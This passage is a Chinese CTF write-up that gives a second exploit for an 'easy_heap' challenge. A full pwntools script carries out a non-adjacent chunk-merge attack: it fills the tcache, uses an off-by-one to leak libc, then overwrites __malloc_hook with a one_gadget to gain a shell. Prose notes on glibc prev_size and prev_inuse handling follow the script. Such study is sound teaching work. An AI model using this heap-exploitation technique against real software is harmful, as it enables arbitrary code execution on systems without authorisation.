EXP2：利用隔块合并攻击
    from pwn import *
    #ARCH SETTING
    context(arch = 'amd64' , os = 'linux')
    r = process('./easy_heap')
    #r = remote('127.0.0.1',9999)
    #FUNCTION DEFINE
    def new(size,content):
    r.recvuntil("?n> ")
    r.sendline("1")
    r.recvuntil("size n> ")
    r.sendline(str(size))
    r.recvuntil("content n> ")
    r.send(content)
    def newz():
    r.recvuntil("?n> ")
    r.sendline("1")
    r.recvuntil("size n> ")
    r.sendline(str(0))
    def delet(idx):
    r.recvuntil("?n> ")
    r.sendline("2")
    r.recvuntil("index n> ")
    r.sendline(str(idx))
    def echo(idx):
    r.recvuntil("?n> ")
    r.sendline("3")
    r.recvuntil("index n> ")
    r.sendline(str(idx))
    #MAIN EXPLOIT
    #memory leak
    #prepare for EG attack ,we will build a chunk with presize 0x200
    for i in range(10):
    newz()
    #fill tcache
    for i in range(3,10):
    delet(i)
    #chunk0 1 merge to ustbin, and the chunk2.presize will be 0x200
    delet(0)
    delet(1)
    delet(2) #to make presize stable;maybe only link change both presize and sizeinuse, unlink only change inuse
    #x = input("debug")
    #then our target is cross-merge
    #for cross-merge we must make sure that chunk0 is freed for bypass
    #clean tcache
    for i in range(7):
    newz() #idx.0~7
    #x = input("debug33")
    newz() #idx.7 chunk0
    #x = input("debug33")
    newz() #idx.8 chunk1
    #x = input("debug33")
    newz() #idx.9 chunk2
    #x = input("debugggg")
    #fill tcache
    for i in range(0,7):
    delet(i)
    #chunk0 into unsorted bin to correct fd & bk for bypass unlink check
    delet(7)
    #out a chunk from tcache to give a space for chunk1 in-out ,in order to prevent merging again
    newz() #idx.0
    delet(8)
    new(0xf8,'x00') #idx.1 ,we hold it
    delet(0) #give back idx.0 to refill tcache
    delet(9) #fire
    #x = input("debug0")
    #clean tcache
    for i in range(7):
    newz() #idx:0 , 2~7
    newz() #idx.8 to cut chunk0, now chunk1.fd & bk point unsorted bin merging with chunk2
    #x = input("debug")
    echo(1)
    unsorted_bin = u64(r.recv(6).ljust(8,'x00'))
    libc_base = unsorted_bin - 0x3dac78
    print(hex(libc_base))
    malloc_hook = libc_base + 0x3dac10
    onegadget = libc_base + 0xfdb8e #0x47ca1 #0x7838e #0x47c9a #0xfccde
    #x = input("pause")
    #hijack
    newz() #idx.9
    #now we hold idx.1&9 pointing chunk1
    delet(0) #passby counts check
    delet(1)
    delet(9)
    new(0x10,p64(malloc_hook))
    newz()
    new(0x10,p64(onegadget))
    #fire
    #according to the logic that size is inputed after malloc
    delet(2) #passby idxtable full check
    #x = input("fucking")
    r.recvuntil("?n> ")
    r.sendline("1")
    r.interactive()
-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
### 四、exp详解
1.细节问题：就是该题的索引表存储上限只有10个，exp执行过程中要时刻注意是否满了，以保证能通过索引表填满的检查
2.exp1个人感觉没啥大问题，读者自己读一下exp代码、注释，跟着调一下问题应该不大
3.exp2读者如果有问题的话，我猜应该是和size、presize、preinuse这三个关键字段是在何时设置有关，因为这直接影响到能否通过诸多检查，我们在下面“特性补充”部分单独说
### 五、特性补充
#### 一、
1.preinuse位何时置零：仅在前块link入unsorted bin过程中置零
2.size字段何时设置：仅在①alloc过程中设置 ②合并过程中合并后link入unsorted bin前设置
*3.presize字段何时设置：仅在前块link入unsorted bin过程中设置
4.单独的unlink动作不对后块preinuse位置1
5.堆块合并过程：先unlink前块，再合并，再link入unsorted bin
6.堆块合并过程中，指针变化和合并后的size计算是以用户free的那个块为中心，而前面提到的size==next.presize检查则是以被合并的前块为中心：堆块指针在合并后直接用presize值前推偏移，新size也是用户free块的size直接加上presize，而新增检查则是以前块为中心的
#### 二、因此，我们的exp2实现隔块合并攻击的思路就是：
1.制造仨chunk全都free合并入unsorted bin：这时chunk3的presize为2*chunk
2.再把它们分配出来
3.chunk1给free进unsorted bin：①隔块合并它的时候能天然绕过bk、fd那个检查 ②chunk2的presize为1*chunk
4.chunk2先free进tcache，再分配到它off by one：①代码逻辑决定只能在分配的时候写那么一次而没有单独的编辑函数
②进tcache要先new出一个腾地方，不能进unsorted bin是为了防止和chunk1合并破坏之前的铺垫
5.free掉chunk3即可隔块合并到chunk1：chunk3的presize是2*chunk找到chunk1了，chunk1做size检查找到chunk2的presize是1*chunk绕过成功，fd、bk那个检查也是天然过的
### 六、思考与总结
其实堆的利用有点像华容道、推箱子这种游戏，倒来倒去的，所以建议大家多玩这种游戏（突然智障233333）
libc的源码还是要审的，强烈建议各位一定抽时间一天看一点，把libc源码争取能全部看完
最后留一个挑战：读者认为该题进行隔块合并攻击时，开始只需要俩chunk进unsorted
bin就可以了，chunk3开始是没必要delet的，你觉得是不是更简洁呢？不妨按这个思路自行写写exp看，笔者还没有这样写过，写好会在下一篇文章补充发上来哦~